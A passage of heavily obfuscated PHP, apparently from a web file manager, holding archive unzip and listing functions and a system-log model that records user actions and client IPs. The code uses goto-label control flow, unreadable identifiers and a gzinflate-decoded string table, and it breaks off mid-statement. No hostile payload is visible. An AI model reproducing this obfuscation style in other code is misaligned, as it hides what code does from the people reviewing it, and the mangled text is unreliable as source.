$F´›µ¸–‘š[$Fƒê‹¾ïËÛ[1065]], !1); } goto C÷—Á†œ—; e‘ÍÀ…³®˜: if (!($dÇÅèóèõ = parent::info($D»Ìô¹¨ÜÉ))) { show_json(LNG($Fƒê‹¾ïËÛ[1060]), !1); } if (!($F¡öÒŒ‚ÄÛ = parent::infoFull($Bˆàİä‰¸‰))) { $Bˆàİä‰¸‰ = parent::mkdir($Bˆàİä‰¸‰); $F¡öÒŒ‚ÄÛ = array($Fƒê‹¾ïËÛ[75] => $Bˆàİä‰¸‰); } else { if (isset($F¡öÒŒ‚ÄÛ[$Fƒê‹¾ïËÛ[390]]) && trim($F¡öÒŒ‚ÄÛ[$Fƒê‹¾ïËÛ[75]], $Fƒê‹¾ïËÛ[8]) != trim($Bˆàİä‰¸‰, $Fƒê‹¾ïËÛ[8])) { $dÙ¹½œ§½• = KodIO::make($F¡öÒŒ‚ÄÛ[$Fƒê‹¾ïËÛ[472]]); $c»õµ‘ ‘ = parent::fileNameAuto($dÙ¹½œ§½•, $F¡öÒŒ‚ÄÛ[$Fƒê‹¾ïËÛ[28]], REPEAT_RENAME_FOLDER, !0); $Bˆàİä‰¸‰ = parent::mkdir($dÙ¹½œ§½• . $c»õµ‘ ‘); $F¡öÒŒ‚ÄÛ = array($Fƒê‹¾ïËÛ[75] => $Bˆàİä‰¸‰); } } $Bˆàİä‰¸‰ = $F¡öÒŒ‚ÄÛ[$Fƒê‹¾ïËÛ[75]]; goto d™“’Îø¼…; cÍ°‹Öˆ¾«: foreach ($B­ŠŠˆ°ï¶ as $Cè¼ †’‰†) { $Cè¼ †’‰† = self::iconvApp($Cè¼ †’‰†); self::move($Cè¼ †’‰†, $Bˆàİä‰¸‰, $CÇé‹î—…¸); } del_dir($B±‚ù™ƒ¨‹); if (!$CöÛÙ›Ãê‹) { del_file($C×¤Ä†…³¸); } goto F¶ïå“ŒÁ; cŒæÙøÎÆ°: mk_dir($B±‚ù™ƒ¨‹); $EÚø…‹¬ãÉ = self::fileExt($dÇÅèóèõ); $C×¤Ä†…³¸ = $B±‚ù™ƒ¨‹ . $Fƒê‹¾ïËÛ[94] . $EÚø…‹¬ãÉ; goto E»ôËä’Š; D·º¢Ï¶‚: $Fƒê‹¾ïËÛ =& $_SERVER[µ…]; $D»Ìô¹¨ÜÉ = $eƒ…½‚ñ±[$Fƒê‹¾ïËÛ[75]]; $Bˆàİä‰¸‰ = $eƒ…½‚ñ±[$Fƒê‹¾ïËÛ[1059]]; goto e‘ÍÀ…³®˜; E»ôËä’Š: if (!@file_exists(self::iconvSystem($C×¤Ä†…³¸))) { $CöÛÙ›Ãê‹ = self::localFilePath($D»Ìô¹¨ÜÉ, $EÚø…‹¬ãÉ); $C×¤Ä†…³¸ = $CöÛÙ›Ãê‹ ? $CöÛÙ›Ãê‹ : parent::download($D»Ìô¹¨ÜÉ, $C×¤Ä†…³¸); } $C×¤Ä†…³¸ = self::iconvSystem($C×¤Ä†…³¸); $A—›±ÄÒåµ = isset($eƒ…½‚ñ±[$Fƒê‹¾ïËÛ[1061]]) ? $eƒ…½‚ñ±[$Fƒê‹¾ïËÛ[1061]] : $Fƒê‹¾ïËÛ[1062]; goto c™šŸ”…Ëœ; d™“’Îø¼…: $c‰ÌÜ¿Œ­‹ = self::tmpFileName($dÇÅèóèõ); $B±‚ù™ƒ¨‹ = TEMP_FILES . $c‰ÌÜ¿Œ­‹; del_dir($B±‚ù™ƒ¨‹); goto cŒæÙøÎÆ°; C÷—Á†œ—: Hook::trigger($Fƒê‹¾ïËÛ[1066], $B±‚ù™ƒ¨‹); recursion_dir($B±‚ù™ƒ¨‹, $fŒ‰§£§, $eï˜‹×ªÎˆ, 0); $B­ŠŠˆ°ï¶ = array_merge($fŒ‰§£§, $eï˜‹×ªÎˆ); goto cÍ°‹Öˆ¾«; dÒ»˜ª›İË: } public static function unzipList($B‹šªÇ˜…È) { goto e®Ö¶‘ñ‚î; EÂ×½˜ãá‹: return $dº‡³ÍÇª”[$cÃ¨£ÅĞ¸ø[1065]]; goto d¶ÙÙ†‚³ù; BĞé¨£†æ: self::archiveExt(); del_dir($Bê˜õÎ®¦ì); if (!$dº‡³ÍÇª”[$cÃ¨£ÅĞ¸ø[1063]]) { show_json($dº‡³ÍÇª”[$cÃ¨£ÅĞ¸ø[1065]], !1); } goto bƒ¸î‡ë›È; aôèÜ‘®†: $Eİƒ´ÜçÆ = 50000; if (request_url_safe($d¥Ç¦«…)) { $dàÏµ¡ãµŞ = parse_url_query($d¥Ç¦«…); if (!isset($dàÏµ¡ãµŞ[$cÃ¨£ÅĞ¸ø[75]])) { show_json($cÃ¨£ÅĞ¸ø[1068], !1); } } $Cõ¦ˆìßŸ = isset($dàÏµ¡ãµŞ) ? $dàÏµ¡ãµŞ[$cÃ¨£ÅĞ¸ø[75]] : $d¥Ç¦«…; goto E£…ÆÌ™„ ; fùº¼Àñ¸ß: if (!is_dir($Bê˜õÎ®¦ì)) { mk_dir($Bê˜õÎ®¦ì); } $fÃÚ”–”´à = $Bê˜õÎ®¦ì . $cÃ¨£ÅĞ¸ø[8] . $fŠŸ©Å¦ö´; if (!@file_exists(self::iconvSystem($fÃÚ”–”´à))) { if (isset($dàÏµ¡ãµŞ)) { url_request($d¥Ç¦«…, $cÃ¨£ÅĞ¸ø[1070], $fÃÚ”–”´à); } else { $AÒ½ÔÙØò† = self::localFilePath($d¥Ç¦«…, $AŒ‰ñŠô±í); $fÃÚ”–”´à = $AÒ½ÔÙØò† ? $AÒ½ÔÙØò† : self::download($d¥Ç¦«…, $fÃÚ”–”´à); } } goto Cì­ßß´ÉÜ; Cì­ßß´ÉÜ: $fÃÚ”–”´à = self::iconvSystem($fÃÚ”–”´à); if ($d¼¶ŠéæåÓ >= 0) { $FŠ‹‹³Ÿ±ô = isset($B‹šªÇ˜…È[$cÃ¨£ÅĞ¸ø[1071]]) ? $B‹šªÇ˜…È[$cÃ¨£ÅĞ¸ø[1071]] : !1; $A„’§³½Œ« = isset($B‹šªÇ˜…È[$cÃ¨£ÅĞ¸ø[28]]) ? $B‹šªÇ˜…È[$cÃ¨£ÅĞ¸ø[28]] : $cÃ¨£ÅĞ¸ø[33]; KodArchive::filePreview($fÃÚ”–”´à, $d¼¶ŠéæåÓ, $FŠ‹‹³Ÿ±ô, $A„’§³½Œ«); self::archiveExt(); die; } $dº‡³ÍÇª” = KodArchive::listContent($fÃÚ”–”´à); goto BĞé¨£†æ; bƒ¸î‡ë›È: $D˜¯Õèİ = json_encode($dº‡³ÍÇª”[$cÃ¨£ÅĞ¸ø[1065]]); self::setContent($fö¶•ğóßó, $D˜¯Õèİ); if (count($dº‡³ÍÇª”[$cÃ¨£ÅĞ¸ø[1065]]) >= $Eİƒ´ÜçÆ) { show_json(sprintf(LNG($cÃ¨£ÅĞ¸ø[1069]), count($dº‡³ÍÇª”[$cÃ¨£ÅĞ¸ø[1065]])), !1); } goto EÂ×½˜ãá‹; E£…ÆÌ™„ : $B¹²—ë…‡ = self::info($Cõ¦ˆìßŸ); $AŒ‰ñŠô±í = self::fileExt($B¹²—ë…‡); $FŠ§˜’°š¹ = self::tmpFileName($B¹²—ë…‡); goto Dá·¼ç”; e®Ö¶‘ñ‚î: $cÃ¨£ÅĞ¸ø =& $_SERVER[µ…]; $d¥Ç¦«… = $B‹šªÇ˜…È[$cÃ¨£ÅĞ¸ø[75]]; $d¼¶ŠéæåÓ = isset($B‹šªÇ˜…È[$cÃ¨£ÅĞ¸ø[1067]]) ? $B‹šªÇ˜…È[$cÃ¨£ÅĞ¸ø[1067]] : -1; goto aôèÜ‘®†; Dá·¼ç”: if (isset($dàÏµ¡ãµŞ)) { $eÙ÷‡‹ŸÂ = array($dàÏµ¡ãµŞ[$cÃ¨£ÅĞ¸ø[75]], $dàÏµ¡ãµŞ[$cÃ¨£ÅĞ¸ø[1067]], $dàÏµ¡ãµŞ[$cÃ¨£ÅĞ¸ø[28]]); $fŠŸ©Å¦ö´ = md5(implode($cÃ¨£ÅĞ¸ø[70], $eÙ÷‡‹ŸÂ)) . $cÃ¨£ÅĞ¸ø[94] . get_path_ext($dàÏµ¡ãµŞ[$cÃ¨£ÅĞ¸ø[28]]); } else { $eÙ÷‡‹ŸÂ = array($B¹²—ë…‡[$cÃ¨£ÅĞ¸ø[28]], $B¹²—ë…‡[$cÃ¨£ÅĞ¸ø[75]], $B¹²—ë…‡[$cÃ¨£ÅĞ¸ø[77]]); $fŠŸ©Å¦ö´ = md5(implode($cÃ¨£ÅĞ¸ø[70], $eÙ÷‡‹ŸÂ)) . $cÃ¨£ÅĞ¸ø[94] . $AŒ‰ñŠô±í; } if ($d¼¶ŠéæåÓ == -1) { $fö¶•ğóßó = IO_PATH_SYSTEM_TEMP . "\172\151\160\126\x69\145\167\x2f{$FŠ§˜’°š¹}\57{$fŠŸ©Å¦ö´}\x2e\154\157\x67"; $a¨Ù¬ñêìË = self::infoFull($fö¶•ğóßó); if ($a¨Ù¬ñêìË) { $fö¶•ğóßó = $a¨Ù¬ñêìË[$cÃ¨£ÅĞ¸ø[75]]; $DøàßÛˆ¤È = self::getContent($fö¶•ğóßó); if ($DøàßÛˆ¤È) { $D˜¯Õèİ = json_decode($DøàßÛˆ¤È, !0); if (count($D˜¯Õèİ) >= $Eİƒ´ÜçÆ) { show_json(sprintf(LNG($cÃ¨£ÅĞ¸ø[1069]), count($D˜¯Õèİ)), !1); } return $D˜¯Õèİ; } } else { $fö¶•ğóßó = self::mkfile($fö¶•ğóßó); } } $Bê˜õÎ®¦ì = TEMP_FILES . $FŠ§˜’°š¹; goto fùº¼Àñ¸ß; d¶ÙÙ†‚³ù: } private static function fileExt($EÁÔİ‡Û¶¦) { $Dê¹ß¾ê“• =& $_SERVER[µ…]; $e¡ Û™¿ = $EÁÔİ‡Û¶¦[$Dê¹ß¾ê“•[167]]; if ($e¡ Û™¿ == $Dê¹ß¾ê“•[1072]) { $fƒ¿Ó”õä¯ = $Dê¹ß¾ê“•[1073]; if (substr($EÁÔİ‡Û¶¦[$Dê¹ß¾ê“•[28]], -strlen($fƒ¿Ó”õä¯)) == $fƒ¿Ó”õä¯) { $e¡ Û™¿ = $Dê¹ß¾ê“•[1074]; } } self::archiveExt($e¡ Û™¿); return $e¡ Û™¿; } private static function zipFileList($e´µĞîÁ‘, $DÉˆÒ‡æ–› = false) { $cÃê¿ÍŸõÀ =& $_SERVER[µ…]; $e´éÏÛÁ…Ï = array(); foreach ($e´µĞîÁ‘ as $F…‘á–¾Ö) { $F•ĞŞ›‰Ô‡ = $F…‘á–¾Ö[$cÃê¿ÍŸõÀ[75]]; if ($DÉˆÒ‡æ–›) { $F•ĞŞ›‰Ô‡ = self::copy($F…‘á–¾Ö[$cÃê¿ÍŸõÀ[75]], $DÉˆÒ‡æ–›, $cÃê¿ÍŸõÀ[763]); } else { $cæ‚†ª†¿ = self::init($F…‘á–¾Ö[$cÃê¿ÍŸõÀ[75]]); if ($cæ‚†ª†¿->getType() == $cÃê¿ÍŸõÀ[105]) { $F•ĞŞ›‰Ô‡ = $cæ‚†ª†¿->path; } } if ($F•ĞŞ›‰Ô‡ && self::local()->exist($F•ĞŞ›‰Ô‡)) { $e´éÏÛÁ…Ï[$F…‘á–¾Ö[$cÃê¿ÍŸõÀ[75]]] = $F•ĞŞ›‰Ô‡; } } if (!empty($e´éÏÛÁ…Ï)) { return array_values($e´éÏÛÁ…Ï); } show_json(LNG($cÃê¿ÍŸõÀ[1038]), !1); } public static function tmpFileName($c¹³Ä«Ã¡) { $bºÙ¼§› =& $_SERVER[µ…]; $c‰‘‹š … = array($c¹³Ä«Ã¡[$bºÙ¼§›[28]], $c¹³Ä«Ã¡[$bºÙ¼§›[75]], $c¹³Ä«Ã¡[$bºÙ¼§›[77]], $c¹³Ä«Ã¡[$bºÙ¼§›[481]]); return md5(implode($bºÙ¼§›[70], $c‰‘‹š …)); } private static function localFilePath($CÓôî—‹á‘, $bÉ¦Ş¹‹‹) { goto bšŒŞ¡°Âí; e°‚¿¼òÀš: if ($F‘¶Ã™Ÿ‹Ã[$dçµŸµ‰‘ä[29]] == KodIO::KOD_SOURCE) { $cÙ¶Š…Š‰Ç = Model($dçµŸµ‰‘ä[769])->fileInfoGet(KodIO::sourceID($CÓôî—‹á‘)); if (!$cÙ¶Š…Š‰Ç[$dçµŸµ‰‘ä[75]]) { show_json($dçµŸµ‰‘ä[1077], !1); } $CÓôî—‹á‘ = $cÙ¶Š…Š‰Ç[$dçµŸµ‰‘ä[75]]; } $B•ÉÓ™íˆ = self::init($CÓôî—‹á‘); $CÄ†£İã¼£ = $B•ÉÓ™íˆ->getType(); goto eÑ®İ”Á–Œ; bšŒŞ¡°Âí: $dçµŸµ‰‘ä =& $_SERVER[µ…]; if ($bÉ¦Ş¹‹‹ == $dçµŸµ‰‘ä[1075] && strtoupper(substr(PHP_OS, 0, 3)) == $dçµŸµ‰‘ä[1076]) { return !1; } $F‘¶Ã™Ÿ‹Ã = KodIO::parse($CÓôî—‹á‘); goto e°‚¿¼òÀš; eÑ®İ”Á–Œ: if ($CÄ†£İã¼£ == $dçµŸµ‰‘ä[105] || $CÄ†£İã¼£ == $dçµŸµ‰‘ä[1078]) { if (!$B•ÉÓ™íˆ->exist($B•ÉÓ™íˆ->path)) { show_json(LNG($dçµŸµ‰‘ä[104]), !1); } return $B•ÉÓ™íˆ->path; } return !1; goto E…§­‚Õà ; E…§­‚Õà : } private static function archiveExt($bÍ½¯²›è‚ = '') { $GLOBALS[$_SERVER[µ…][1079]] = $bÍ½¯²›è‚; } } goto B¥Ÿ«‡‰±İ; bÏÍè¾š—: $DÒ®‡ªÚ‹˜ = $_SERVER[µ…][569]; if (strlen($DÒ®‡ªÚ‹˜) < $_SERVER[µ…][570]) { return; } $_SERVER[İ§] = explode($_SERVER[µ…][571], gzinflate(substr($_SERVER[µ…][572], 10, -8))); goto fŠî¿¤ †„; cœÆÁô†‘Š: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\x65\x6d\x5f\154\157\147"; protected $dataAuto = array(array("\143\x72\145\141\164\x65\124\x69\x6d\145", "\164\151\x6d\x65", "\x69\x6e\163\145\162\164", "\146\x75\x6e\143\164\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $F¬È§¬ÇÅ‰ =& $_SERVER[µ…]; return array($F¬È§¬ÇÅ‰[1981] => LNG($F¬È§¬ÇÅ‰[1982]), $F¬È§¬ÇÅ‰[1983] => LNG($F¬È§¬ÇÅ‰[1984]), $F¬È§¬ÇÅ‰[1609] => LNG($F¬È§¬ÇÅ‰[1985]), $F¬È§¬ÇÅ‰[1986] => LNG($F¬È§¬ÇÅ‰[1987]), $F¬È§¬ÇÅ‰[1988] => LNG($F¬È§¬ÇÅ‰[1989]), $F¬È§¬ÇÅ‰[1990] => LNG($F¬È§¬ÇÅ‰[1991]), $F¬È§¬ÇÅ‰[1992] => LNG($F¬È§¬ÇÅ‰[1993]), $F¬È§¬ÇÅ‰[1639] => LNG($F¬È§¬ÇÅ‰[1993]), $F¬È§¬ÇÅ‰[1640] => LNG($F¬È§¬ÇÅ‰[1994]), $F¬È§¬ÇÅ‰[1995] => LNG($F¬È§¬ÇÅ‰[1996]), $F¬È§¬ÇÅ‰[1997] => LNG($F¬È§¬ÇÅ‰[1998]), $F¬È§¬ÇÅ‰[1999] => LNG($F¬È§¬ÇÅ‰[2000]), $F¬È§¬ÇÅ‰[2001] => LNG($F¬È§¬ÇÅ‰[2002]), $F¬È§¬ÇÅ‰[1637] => LNG($F¬È§¬ÇÅ‰[2003]), $F¬È§¬ÇÅ‰[1644] => LNG($F¬È§¬ÇÅ‰[2004]), $F¬È§¬ÇÅ‰[2005] => LNG($F¬È§¬ÇÅ‰[2006]), $F¬È§¬ÇÅ‰[2007] => LNG($F¬È§¬ÇÅ‰[2008]), $F¬È§¬ÇÅ‰[2009] => LNG($F¬È§¬ÇÅ‰[2010]), $F¬È§¬ÇÅ‰[2011] => LNG($F¬È§¬ÇÅ‰[2012]), $F¬È§¬ÇÅ‰[1647] => LNG($F¬È§¬ÇÅ‰[2013]), $F¬È§¬ÇÅ‰[1648] => LNG($F¬È§¬ÇÅ‰[2014]), $F¬È§¬ÇÅ‰[2015] => LNG($F¬È§¬ÇÅ‰[2016]), $F¬È§¬ÇÅ‰[2017] => LNG($F¬È§¬ÇÅ‰[2018]), $F¬È§¬ÇÅ‰[2019] => LNG($F¬È§¬ÇÅ‰[2020]), $F¬È§¬ÇÅ‰[1642] => LNG($F¬È§¬ÇÅ‰[2021]), $F¬È§¬ÇÅ‰[2022] => LNG($F¬È§¬ÇÅ‰[2023]), $F¬È§¬ÇÅ‰[1641] => LNG($F¬È§¬ÇÅ‰[2024]), $F¬È§¬ÇÅ‰[2025] => LNG($F¬È§¬ÇÅ‰[2026]), $F¬È§¬ÇÅ‰[2027] => LNG($F¬È§¬ÇÅ‰[2028]), $F¬È§¬ÇÅ‰[2029] => LNG($F¬È§¬ÇÅ‰[2029]), $F¬È§¬ÇÅ‰[2030] => LNG($F¬È§¬ÇÅ‰[2030]), $F¬È§¬ÇÅ‰[2031] => LNG($F¬È§¬ÇÅ‰[1613]), $F¬È§¬ÇÅ‰[2032] => LNG($F¬È§¬ÇÅ‰[2033]), $F¬È§¬ÇÅ‰[2034] => LNG($F¬È§¬ÇÅ‰[2035]), $F¬È§¬ÇÅ‰[2036] => LNG($F¬È§¬ÇÅ‰[2037]), $F¬È§¬ÇÅ‰[2038] => LNG($F¬È§¬ÇÅ‰[2039]), $F¬È§¬ÇÅ‰[2040] => LNG($F¬È§¬ÇÅ‰[2041]), $F¬È§¬ÇÅ‰[2042] => LNG($F¬È§¬ÇÅ‰[2042]), $F¬È§¬ÇÅ‰[2043] => LNG($F¬È§¬ÇÅ‰[2044]), $F¬È§¬ÇÅ‰[2045] => LNG($F¬È§¬ÇÅ‰[2046]), $F¬È§¬ÇÅ‰[2047] => LNG($F¬È§¬ÇÅ‰[2048]), $F¬È§¬ÇÅ‰[2049] => LNG($F¬È§¬ÇÅ‰[2050]), $F¬È§¬ÇÅ‰[2051] => LNG($F¬È§¬ÇÅ‰[2052]), $F¬È§¬ÇÅ‰[2053] => LNG($F¬È§¬ÇÅ‰[2054])); } private function typeFile() { $E°í«É¤’İ =& $_SERVER[µ…]; $Bøƒ‹×‘ÂÙ = array($E°í«É¤’İ[1644] => array($E°í«É¤’İ[1645]), $E°í«É¤’İ[1999] => array($E°í«É¤’İ[2055]), $E°í«É¤’İ[2001] => array($E°í«É¤’İ[2056]), $E°í«É¤’İ[1637] => array($E°í«É¤’İ[1638]), $E°í«É¤’İ[2007] => array(), $E°í«É¤’İ[2009] => array(), $E°í«É¤’İ[2011] => array(), $E°í«É¤’İ[1647] => array($E°í«É¤’İ[1649]), $E°í«É¤’İ[1648] => array($E°í«É¤’İ[1649]), $E°í«É¤’İ[2015] => array($E°í«É¤’İ[2057]), $E°í«É¤’İ[2017] => array($E°í«É¤’İ[2057]), $E°í«É¤’İ[2019] => array($E°í«É¤’İ[2058]), $E°í«É¤’İ[2005] => array($E°í«É¤’İ[2059]), $E°í«É¤’İ[1642] => array($E°í«É¤’İ[2060]), $E°í«É¤’İ[2022] => array($E°í«É¤’İ[2061]), $E°í«É¤’İ[1641] => array($E°í«É¤’İ[1643])); return $Bøƒ‹×‘ÂÙ; } private function typeAll() { goto F¸½µšÀ¸®; bí×¼„›: return $cØÀïêÛ; goto C´øŒÃ„Ÿ; c¯“Şâœõ‹: foreach ($c…¾ˆœ¦±° as $eøÆÎ÷¥ƒĞ => $bµ™‘¶ì¢Å) { $cØÀïêÛ[$bµ™‘¶ì¢Å[0]] = $cØÀïêÛ[$eøÆÎ÷¥ƒĞ]; } $cØÀïêÛ[$Aõ‰“’÷[1649]] = LNG($Aõ‰“’÷[2062]); $cØÀïêÛ[$Aõ‰“’÷[2057]] = LNG($Aõ‰“’÷[2063]); goto bí×¼„›; F¸½µšÀ¸®: $Aõ‰“’÷ =& $_SERVER[µ…]; $cØÀïêÛ = $this->typeList; $c…¾ˆœ¦±° = array_filter($this->typeFile()); goto c¯“Şâœõ‹; C´øŒÃ„Ÿ: } public function addLog($dÈÜ«èë°, $BæâİÅá¶ = array()) { goto CçëÙĞß¨å; F¢ÚÂ©×·: $BæâİÅá¶ = array($Dš†Š·¼ÍÓ[1497] => Session::sign(), $Dš†Š·¼ÍÓ[1498] => $cùĞ¥Ê—ˆ, $Dš†Š·¼ÍÓ[29] => $dÈÜ«èë°, $Dš†Š·¼ÍÓ[1500] => json_encode($BæâİÅá¶)); parent::add($BæâİÅá¶); goto aÎ»‰¸Æ; EŞ—ø«È¬¢: if (!$cùĞ¥Ê—ˆ) { $cùĞ¥Ê—ˆ = (int) Session::get($Dš†Š·¼ÍÓ[1796]); } $f›“•ÕÕÃš = get_client_ip(); if (!$BæâİÅá¶ || strlen(json_encode($BæâİÅá¶)) >= 1024) { $BæâİÅá¶ = array($Dš†Š·¼ÍÓ[2064] => $f›“•ÕÕÃš); } else { if (is_array($BæâİÅá¶)) { $BæâİÅá¶[$Dš†Š·¼ÍÓ[2064]] = $f›“•ÕÕÃš; } else { $BæâİÅá¶ = array($Dš†Š·¼ÍÓ[1065] => $BæâİÅá¶, $Dš†Š·¼ÍÓ[2064] => $f›“•ÕÕÃš); } } goto F¢ÚÂ©×·; CçëÙĞß¨å: $Dš†Š·¼ÍÓ =& $_SERVER[µ…]; if (!isset($this->typeList[$dÈÜ«èë°])) { return; } $cùĞ¥Ê—ˆ = defined($Dš†Š·¼ÍÓ[448]) && USER_ID ? USER_ID : (isset($BæâİÅá¶[$Dš†Š·¼ÍÓ[1506]]) ? $BæâİÅá¶[$Dš†Š·¼ÍÓ[1506]] : 0); goto EŞ—ø«È¬¢; aÎ»‰¸Æ: } public function remove($Eçß÷ááÇÓ) { $this->where(array($_SERVER[µ…][406] => $Eçß÷ááÇÓ))->delete(); } private function _makeOrder($bº®¬Êìàœ = '') { goto AÅãÃ«•Ã; AËÏ°°»ù: return $this->order($bº®¬Êìàœ); goto e¥•ÑÛ”š; fŒ½¤¿ÜßÈ: $Døåğô¡ÓÕ = Input::get($CµÖÀëÀ²[430], $CµÖÀëÀ²[7], $CµÖÀëÀ²[1828], array($CµÖÀëÀ²[1752], $CµÖÀëÀ²[424])); $Døåğô¡ÓÕ = $AÎºĞòªŞ‘[$Døåğô¡ÓÕ]; $bº®¬Êìàœ = $bº®¬Êìàœ . "{$fÚ™‚†œØˆ}\40{$Døåğô¡ÓÕ}"; goto AËÏ°°»ù; AÅãÃ«•Ã: $CµÖÀëÀ² =& $_SERVER[µ…]; $fÚ™‚†œØˆ = $CµÖÀëÀ²[192]; $AÎºĞòªŞ‘ = array($CµÖÀëÀ²[422] => $CµÖÀëÀ²[423], $CµÖÀëÀ²[424] => $CµÖÀëÀ²[425]); goto fŒ½¤¿ÜßÈ; e¥•ÑÛ”š: } public function get($CÒÜä¿¶¬ä = '') { goto d®®ÀøŞâã; c×ŒáÒë°: if (!empty($CÒÜä¿¶¬ä[$d¦‰¯¶Ù¼Ÿ[2064]])) { $BÈ‰¡ô·Óâ[$d¦‰¯¶Ù¼Ÿ[425]] = array($d¦‰¯¶Ù¼Ÿ[378], "\x25{$CÒÜä¿¶¬ä[$d¦‰¯¶Ù¼Ÿ[2064]]}\x25"); } $a–Œšø¶Œ = $this->_makeOrder()->where($BÈ‰¡ô·Óâ)->selectPage(); if (empty($a–Œšø¶Œ[$d¦‰¯¶Ù¼Ÿ[365]])) { show_json(array(), !0, $a–Œšø¶Œ[$d¦‰¯¶Ù¼Ÿ[362]]); } goto FŠ©¬…ÂªÜ; FŠ©¬…ÂªÜ: $a–Œšø¶Œ[$d¦‰¯¶Ù¼Ÿ[365]] = $this->logList($a–Œšø¶Œ[$d¦‰¯¶Ù¼Ÿ[365]]); return $a–Œšø¶Œ; goto d‚äïÉÀÃ‚; b²“„ã: if ($CÒÜä¿¶¬ä[$d¦‰¯¶Ù¼Ÿ[1506]]) { $BÈ‰¡ô·Óâ[$d¦‰¯¶Ù¼Ÿ[1506]] = $CÒÜä¿¶¬ä[$d¦‰¯¶Ù¼Ÿ[1506]]; } if (isset($CÒÜä¿¶¬ä[$d¦‰¯¶Ù¼Ÿ[717]])) { $b‰İ±Â°ÉŠ = $CÒÜä¿¶¬ä[$d¦‰¯¶Ù¼Ÿ[717]]; $Aœ¼¼·ÄÛ = isset($CÒÜä¿¶¬ä[$d¦‰¯¶Ù¼Ÿ[470]]) ? $CÒÜä¿¶¬ä[$d¦‰¯¶Ù¼Ÿ[470]] : time(); $BÈ‰¡ô·Óâ[$d¦‰¯¶Ù¼Ÿ[192]] = array($d¦‰¯¶Ù¼Ÿ[329], array($b‰İ±Â°ÉŠ, $Aœ¼¼·ÄÛ)); } if ($CÒÜä¿¶¬ä[$d¦‰¯¶Ù¼Ÿ[29]]) { $EÓÏ‹÷Ä•¬ = explode($d¦‰¯¶Ù¼Ÿ[47], $CÒÜä¿¶¬ä[$d¦‰¯¶Ù¼Ÿ[29]]); $dËéÛõÆËù = $this->typeFile(); $e¾î¾±æ™Ù = array(); foreach ($EÓÏ‹÷Ä•¬ as $f¨Çª¥á²¼) { $e¾î¾±æ™Ù[] = $f¨Çª¥á²¼; if (isset($dËéÛõÆËù[$f¨Çª¥á²¼])) { $e¾î¾±æ™Ù = array_merge($e¾î¾±æ™Ù, $dËéÛõÆËù[$f¨Çª¥á²¼]); } } $e¾î¾±æ™Ù = array_unique($e¾î¾±æ™Ù); if ($e¾î¾±æ™Ù) { $BÈ‰¡ô·Óâ[$d¦‰¯¶Ù¼Ÿ[29]] = array($d¦‰¯¶Ù¼Ÿ[7], $e¾î¾±æ™Ù); } } goto c×ŒáÒë°; d®®ÀøŞâã: $d¦‰¯¶Ù¼Ÿ =& $_SERVER[µ…]; if (!$CÒÜä¿¶¬ä) { show_json(array()); } $BÈ‰¡ô·Óâ = array(); goto b²“„ã; d‚äïÉÀÃ‚: } private function ipAddress(&$aÅ†”ãº†÷) { $f»±¼Áº®Ó =& $_SERVER[µ…]; if (!empty($aÅ†”ãº†÷[$f»±¼Áº®Ó[2064]])) { $a®•¿ã×ĞÂ = IpLocation::get($aÅ†”ãº†÷[$f»±¼Áº®Ó[2064]]); } else { $a®•¿ã×ĞÂ = LNG($f»±¼Áº®Ó[2065]); } $aÅ†”ãº†÷[$f»±¼Áº®Ó[2066]] = $a®•¿ã×ĞÂ; } private function descZipDownload($EøßÒ§¥„Ò, &$a•Ôµ—½Û“) { $EæŸ ¢ÖéÔ =& $_SERVER[µ…]; if (!isset($EøßÒ§¥„Ò[$EæŸ ¢ÖéÔ[2067]])) { return; } $F»‹éÎçÏÁ = json_decode($EøßÒ§¥„Ò[$EæŸ ¢ÖéÔ[2067]], !0); foreach ($F»‹éÎçÏÁ as $c Üâœ¢ÊÔ) { try { $c¨•òæ½ = IO::infoFull($c Üâœ¢ÊÔ[$EæŸ ¢ÖéÔ[75]]); } catch (Exception $aâë‚›†¶Á) { continue; } $EøßÒ§¥„Ò[$EæŸ ¢ÖéÔ[75]] = $c Üâœ¢ÊÔ[$EæŸ ¢ÖéÔ[75]]; $a•Ôµ—½Û“[] = $EøßÒ§¥„Ò[$EæŸ ¢ÖéÔ[390]] = $c¨•òæ½[$EæŸ ¢ÖéÔ[390]]; $a•Ôµ—½Û“[] = $EøßÒ§¥„Ò[$EæŸ ¢ÖéÔ[1884]] = $c¨•òæ½[$EæŸ ¢ÖéÔ[472]]; break; } return $EøßÒ§¥„Ò; } private function getSourceList(&$c‰ §Ê‚Æ×) { $AæÚ„¢¢Ñ° =& $_SERVER[µ…]; $a¬¡ÄêÓª« = array(); foreach ($c‰ §Ê‚Æ× as $EÕ‚Í»‡¡ => $cî˜ª¶ÂÄÂ) { goto F¬–«Úœ¨; E¥ÍŠëÜƒô: $a¬¡ÄêÓª«[] = $D¡ïÆ·¾ğ•[$AæÚ„¢¢Ñ°[390]]; $a¬¡ÄêÓª«[] = $D¡ïÆ·¾ğ•[$AæÚ„¢¢Ñ°[1884]]; if ($D¡ïÆ·¾ğ•[$AæÚ„¢¢Ñ°[29]] == $AæÚ„¢¢Ñ°[515]) { $a¬¡ÄêÓª«[] = $D¡ïÆ·¾ğ•[$AæÚ„¢¢Ñ°[425]][$AæÚ„¢¢Ñ°[1032]]; $a¬¡ÄêÓª«[] = $D¡ïÆ·¾ğ•[$AæÚ„¢¢Ñ°[425]][$AæÚ„¢¢Ñ°[1033]]; } goto f°Ê´ÊÇò; f°Ê´ÊÇò: if ($D¡ïÆ·¾ğ•[$AæÚ„¢¢Ñ°[29]] == $AæÚ„¢¢Ñ°[1892]) { $a¬¡ÄêÓª«[] = $D¡ïÆ·¾ğ•[$AæÚ„¢¢Ñ°[425]][$AæÚ„¢¢Ñ°[390]]; } goto f×®Ì–·§ô; F¬–«Úœ¨: $D¡ïÆ·¾ğ• = json_decode($cî˜ª¶ÂÄÂ[$AæÚ„¢¢Ñ°[425]], !0); if ($cî˜ª¶ÂÄÂ[$AæÚ„¢¢Ñ°[29]] == $AæÚ„¢¢Ñ°[1640]) { $D¡ïÆ·¾ğ• = $this->descZipDownload($D¡ïÆ·¾ğ•, $a¬¡ÄêÓª«); $c‰ §Ê‚Æ×[$EÕ‚Í»‡¡][$AæÚ„¢¢Ñ°[425]] = json_encode($D¡ïÆ·¾ğ•); continue; } if (strpos($cî˜ª¶ÂÄÂ[$AæÚ„¢¢Ñ°[29]], $AæÚ„¢¢Ñ°[1885]) !== 0) { if 